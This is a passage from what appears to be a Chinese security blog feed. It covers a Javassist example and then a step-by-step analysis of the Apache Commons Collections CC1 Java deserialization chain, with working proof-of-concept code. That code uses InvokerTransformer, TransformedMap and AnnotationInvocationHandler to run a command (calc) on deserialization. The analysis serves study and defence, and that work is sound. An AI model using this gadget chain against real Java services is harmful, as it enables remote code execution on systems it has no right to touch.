class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个int类型的age变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType,<span class="string">&quot;age&quot;</span>,ctClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个String类型的name变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span> , ctClass);</span><br><span class="line">        ctField2.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctClass.addField(ctField2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加构造方法"><a href="#添加构造方法" class="headerlink" title="添加构造方法"></a>添加构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个int类型的age变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType,<span class="string">&quot;age&quot;</span>,ctClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个String类型的name变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span> , ctClass);</span><br><span class="line">        ctField2.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctClass.addField(ctField2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加有参构造</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123; CtClass.intType, classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,ctClass);</span><br><span class="line">        ctConstructor1.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.age = $1;$0.name = $2;&#125;&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections1反序列化链分析</title>
      <link href="/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>CommonCollections1简称CC1链，Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。Commons Collections组件里面定义了一个Transformer接口，InvokerTransformer实现了Transformer接口，且可以执行任意方法，这也是CC1链中的主角。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote><p>java &lt; 8u71(再往后它的AnnotationInvocationHandler中readObject函数有改动)</p><p>CommonsCollections &lt;&#x3D; 3.2.1</p></blockquote><h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>网上CC1链的构造有两种，一个是使用TransformedMap类，另一个是利用到LazyMap类，先来看看较为简单的TransformedMap。</p><p>先看看如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码运行结果如下</p><p><img src="/assets/image-20230430210904-os68tot.png" alt="image.png"></p><p>很明显执行了我们代码中定义的calc命令，那我们来逐行分析一下看看代码中是怎么执行命令的。</p><h2 id="TransformedMap-1"><a href="#TransformedMap-1" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  <span class="comment">//20行</span></span><br></pre></td></tr></table></figure><p>创建了一个HashMap对象赋值给innerMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);  <span class="comment">//21行</span></span><br></pre></td></tr></table></figure><p>调用了TransformedMap里的decorate方法 ，且把innerMap 传了进来，后面两个参数我们稍后在分析，看看TransformedMap.decorate这个方法</p><p><img src="/assets/image-20230430211726-rjppwsl.png" alt="image.png"></p><p>new了一个TransformedMap，再跟进</p><p><img src="/assets/image-20230430211840-28xpiqf.png" alt="image.png"></p><p>把传进的参数进行赋值了，根据参数传递关系，这里的keyTransformer和valueTransformer分别为null和transformerChain。</p><p><img src="/assets/image-20230430212915-ewgytvl.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>根据outerMap.put方法看看里面做了什么</p><p><img src="/assets/image-20230430213319-bcq5eve.png" alt="image.png"></p><p>调用了transformKey和transformValue方法</p><p><img src="/assets/image-20230430213459-4hoke9m.png" alt="image.png"></p><p>判断是否等于null，是null的话就等于传进来的object，不是null，则执行keyTransformer和valueTransformer的transform方法。</p><p>那现在我们把第20行、21行、22行代码联系起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  <span class="comment">//20行</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);  <span class="comment">//21行</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);  <span class="comment">//22行</span></span><br></pre></td></tr></table></figure><p>TransformedMap.decorate用来修饰innerMap，也就是我们创建的HashMap，当里面的值不为null且发生改变时触发TransformedMap里的回调函数keyTransformer和valueTransformer。</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这里触发了transformerChain回调函数，执行了transformerChain里面的transform方法，transformerChain是在第19行中创建出来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  <span class="comment">//19行</span></span><br></pre></td></tr></table></figure><p>实例化了ChainedTransformer把transformers传入，transformers我们后看，先跟进ChainedTransformer看看里面的transform方法</p><p><img src="/assets/image-20230430215451-cxqjbcu.png" alt="image.png"></p><p>通过for循环把iTransformers数组遍历出来，依次调用transform方法，且是前⼀个回调返回的结果，作为后⼀个回调的参数传⼊。那我们去看看iTransformers也是我们第19 行代码传入的transformers里面定义。</p><p>其定义在14-18行</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>创建一个ConstantTransformer实例，并把Runtime.getRuntime()获取到的对象传入，跟进</p><p>直接赋值，然后通过回调transform把赋值后的iConstant返回</p><p><img src="/assets/image-20230430225338-c9ck360.png" alt="image.png"></p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类是代码执行的关键，看看这里是怎么做的，创建一个InvokerTransformer，传入三个参数分别为（”exec”, new Class[]{String.class},new Object[]{“calc”}）跟进</p><p><img src="/assets/image-20230430225655-8kfs0xh.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次赋值然后回调transform，然后通过反射执行iMethodName方法，这样就达到了执行exec该方法的目的</p><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>一个接口，里面定义了一个未实现的transform方法，其中ChainedTransformer、ConstantTransformer、InvokerTransformer都实现了Transformer接口</p><p><img src="/assets/image-20230430230204-oi0dke4.png" alt="image.png"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的代码分析，我们已经搞明白了命令执行的原理，把一个集合放入TransformedMap.decorate，且参数里面传入我们精心构造的transformerChain，最终通过outerMap.put的方法去触发回调，达到执行transformerChain里的一系列回调，最终执行我们定义的代码。</p><p>以上构造都是在本地运行，那么在反序列化中，我们该以什么样的思路去构造POC呢？</p><p>回想本地的POC，我们是outerMap.put触发transform回调，那么反序列化，我们就要寻找一个类其里面的readObject方法里面存在某个方法可以触发到transform回调。</p><p>这个类就是</p><blockquote><p>sun.reflect.annotation.AnnotationInvocationHandler</p></blockquote><p>AnnotationInvocationHandler.readObject里触发回调的方法就是</p><blockquote><p>var5.setValue</p></blockquote><p><img src="/assets/image-20230501134726-uzz8kw3.png" alt="image.png"></p><p>所以可以构造如下POC去进行调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">            transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">            Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">            Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">            construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先不用去管为什么这样去构造POC，先去看看反序列化里面的逻辑，然后再回头来看为什么要这样去构造POC。在如下位置打上断点，进行调试程序。</p><p><img src="/assets/image-20230501144212-v7v0agp.png" 